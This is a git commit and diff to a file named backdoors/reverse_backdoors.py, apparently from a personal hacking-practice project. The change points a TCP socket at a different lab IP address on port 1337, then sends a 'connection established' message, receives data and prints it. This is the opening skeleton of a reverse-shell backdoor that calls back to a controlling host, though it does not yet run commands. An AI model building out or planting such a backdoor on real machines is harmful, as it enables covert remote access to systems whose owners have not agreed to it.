3cd23b70705a97cd85b8ea0c8affded7adf7955a
jakiiii <me.jaki@outlook.com>
2018-12-18 08:28:59 +0600

    send and receive data

--- backdoors/reverse_backdoors.py
+++ backdoors/reverse_backdoors.py
@@ -2,4 +2,11 @@
 import socket
 
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("192.168.146.147", 1337))
+connection.connect(("192.168.146.148", 1337))
+
+connection.send("\n[+] connection established.\n".encode())
+
+receive_data = connection.recv(1024)
+print(receive_data)
+
+connection.close()
